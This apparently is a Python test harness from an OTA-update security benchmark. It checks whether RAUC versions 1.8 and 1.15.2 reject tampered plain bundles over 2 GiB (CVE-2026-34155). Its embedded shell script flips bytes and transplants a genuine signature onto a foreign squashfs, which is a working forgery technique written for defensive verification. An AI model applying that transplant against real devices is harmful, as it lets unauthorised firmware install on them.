"""Does the signature cover the whole artifact? RAUC plain bundles > 2 GiB (CVE-2026-34155).

Verification-only scenario (OTA-AUTH-02 / D2 "the signature does not cover everything"),
run in the Docker image bench/clients/rauc-verify with two RAUC versions side by side:
RAUC 1.8 from Debian 12 (the version in the A/B image) and RAUC 1.15.2 (release tarball).
`rauc info --keyring` runs the same signature check (check_bundle) as `rauc install`.

Artifacts, all built in the container with RAUC 1.8 and the vendor key `dev`:
  small      plain bundle, payload < 2 GiB                       (control: sensitivity)
  big        plain bundle, payload 2 GiB + 64 MiB (incompressible padding)
Checks (expected: reject every modified bundle):
  small-ok        untouched small bundle                         -> accept
  small-flip      one byte flipped in the middle of the payload  -> reject
  big-ok          untouched big bundle                           -> accept (1.8) / reject (1.15.2)
  big-flip        one byte flipped 1 GiB into the payload        -> reject
  big-transplant  the big bundle's signature appended to a FOREIGN squashfs (manifest
                  version 666, other rootfs), padded beyond 2 GiB -> reject

  python rauc_sigcover.py [--out results/rauc-sigcover-<date>]
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
from datetime import date
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
IMAGE = "otabench-rauc-verify"
RAUCS = {"rauc-1.8": "rauc", "rauc-1.15.2": "/opt/rauc-1.15.2/bin/rauc"}

SCRIPT = r"""
set -u
cd /work
openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj /CN=otabench-dev \
  -keyout dev.key -out dev.crt 2>/dev/null
mkbundle() {  # dir version rootfs-MiB padding-bytes out
  mkdir -p "$1"
  head -c "$3M" /dev/urandom > "$1/rootfs.ext4"
  [ "$4" -gt 0 ] && head -c "$4" /dev/urandom > "$1/padding.bin"
  printf '[update]\ncompatible=otabench-pilot\nversion=%s\n\n[image.rootfs]\nfilename=rootfs.ext4\n' "$2" > "$1/manifest.raucm"
  rauc bundle --cert=dev.crt --key=dev.key "$1" "$5" >/dev/null 2>bundle.err
  echo "RESULT build $5 rc=$? size=$(stat -c %s "$5" 2>/dev/null) $(tail -1 bundle.err | tr -d '\n')"
}
flip() {  # file offset: complement one byte in place
  b=$(dd if="$1" bs=1 skip="$2" count=1 2>/dev/null | od -An -tu1 | tr -d ' ')
  printf "$(printf '\\%03o' $((255 - b)))" | dd of="$1" bs=1 seek="$2" conv=notrunc 2>/dev/null
}
payload() {  # bundle -> payload size (squashfs part)
  s=$(stat -c %s "$1"); g=$(tail -c 8 "$1" | od -An -tu8 --endian=big | tr -d ' \n'); echo $((s - 8 - g))
}
check() {  # name file
  for r in rauc /opt/rauc-1.15.2/bin/rauc; do
    out=$($r info --keyring=dev.crt --output-format=shell "$2" 2>&1); rc=$?
    v=$(printf '%s\n' "$out" | sed -n "s/^RAUC_MF_VERSION='\(.*\)'/\1/p")
    e=$(printf '%s\n' "$out" | grep -iE 'error|fail|exceed|invalid' | head -1 | tr -d '\n' | cut -c1-160)
    echo "RESULT check $1 $($r --version | tr ' ' '-') rc=$rc version=$v msg=$e"
  done
}
# control: a small bundle
mkbundle small 2 8 0 small.raucb
check small-ok small.raucb
flip small.raucb $(( $(payload small.raucb) / 2 ))
check small-flip small.raucb
# a plain bundle with a payload beyond 2 GiB, signed by RAUC 1.8
mkbundle big 2 8 $((2048 * 1048576 + 64 * 1048576)) big.raucb
printf '[update]\ncompatible=otabench-pilot\nversion=2\n\n[image.rootfs]\nfilename=rootfs.ext4\n' > big/manifest.raucm
/opt/rauc-1.15.2/bin/rauc bundle --cert=dev.crt --key=dev.key big big-1152.raucb >/dev/null 2>bundle.err
echo "RESULT build-1.15.2 big rc=$? $(tail -1 bundle.err | tr -d '\n' | cut -c1-160)"
rm -f big-1152.raucb
P=$(payload big.raucb)
echo "RESULT big payload=$P head=$(head -c 16 big.raucb | od -An -tx1 | tr -d '\n')"
check big-ok big.raucb
# signature transplant: a foreign squashfs (other rootfs, version 666, same file layout)
mkdir -p evil && cp big/padding.bin evil/ && rm -rf big
head -c 8M /dev/urandom > evil/rootfs.ext4
printf '[update]\ncompatible=otabench-pilot\nversion=666\n\n[image.rootfs]\nfilename=rootfs.ext4\nsha256=%s\nsize=%s\n' \
  "$(sha256sum evil/rootfs.ext4 | cut -d' ' -f1)" "$(stat -c %s evil/rootfs.ext4)" > evil/manifest.raucm
mksquashfs evil evil.raucb -all-root -noappend -no-progress >/dev/null
rm -rf evil
echo "RESULT evil head=$(head -c 16 evil.raucb | od -An -tx1 | tr -d '\n') size=$(stat -c %s evil.raucb)"
tail -c $(( $(stat -c %s big.raucb) - P )) big.raucb >> evil.raucb
check big-transplant evil.raucb
rm -f evil.raucb
flip big.raucb 1073741824
check big-flip big.raucb
"""


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=str(ROOT / "results" / f"rauc-sigcover-{date.today()}"))
    a = ap.parse_args()
    p = subprocess.run(["docker", "run", "--rm", IMAGE, "sh", "-c", SCRIPT],
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    lines = [ln[len("RESULT "):] for ln in p.stdout.splitlines() if ln.startswith("RESULT ")]
    print("\n".join(lines))
    if p.returncode != 0 or not lines:
        print(p.stderr[-2000:], file=sys.stderr)
    checks: dict[str, dict] = {}
    for ln in lines:
        if not ln.startswith("check "):
            continue
        _, name, ver, rest = ln.split(" ", 3)
        rc = int(rest.split("rc=", 1)[1].split()[0])
        version = rest.split("version=", 1)[1].split(" msg=")[0]
        msg = rest.split(" msg=", 1)[1] if " msg=" in rest else ""
        checks.setdefault(name, {})[ver.replace("rauc-", "rauc ")] = {
            "accepted": rc == 0, "rc": rc, "manifest_version": version, "msg": msg}
    expect_accept = {"small-ok"}
    verdicts = {}
    for impl in ("rauc 1.8", "rauc 1.15.2"):
        bad = [n for n, c in checks.items() if n not in expect_accept and n != "big-ok"
               and c.get(impl, {}).get("accepted")]
        ctl_ok = checks.get("small-ok", {}).get(impl, {}).get("accepted") and \
            not checks.get("small-flip", {}).get(impl, {}).get("accepted", True)
        verdicts[impl] = "ERROR" if not ctl_ok else ("FAIL" if bad else "PASS")
        verdicts[impl + " accepted modified"] = bad
    out = Path(a.out)
    out.mkdir(parents=True, exist_ok=True)
    res = {"scenario": "rauc-sigcover", "threats": ["OTA-AUTH-02"], "image": IMAGE,
           "raw": lines, "checks": checks, "verdicts": verdicts}
    (out / "result.json").write_text(json.dumps(res, ensure_ascii=False, indent=1), encoding="utf-8")
    print(json.dumps(verdicts, ensure_ascii=False))
    print(f"results: {out / 'result.json'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
